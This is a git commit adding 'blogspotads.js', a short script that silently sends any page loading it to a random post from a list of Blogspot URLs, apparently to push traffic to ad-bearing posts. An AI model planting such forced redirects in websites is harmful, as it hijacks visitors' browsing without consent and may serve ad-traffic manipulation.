ab4a642bc8429b4212f6e494aec26cc5580d3839
Angga Nurf <31128877+angganurf@users.noreply.github.com>
2026-03-17 02:53:32 +0700

    Create blogspotads.js

---
+++ blogspotads.js
@@ -0,0 +1,12 @@
+var dataUrl = [
+
+'https://thaisocieties.blogspot.com/2025/04/man-charged-norwalk-man-faces-attempted.html',
+'https://thaisocieties.blogspot.com/2026/03/media-1.html',
+'https://thaisocieties.blogspot.com/2026/03/media-2.html',
+'https://thaisocieties.blogspot.com/2026/03/media-3.html',
+'https://thaisocieties.blogspot.com/2026/03/media-4.html',
+'https://thaisocieties.blogspot.com/2026/03/media-5.html'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
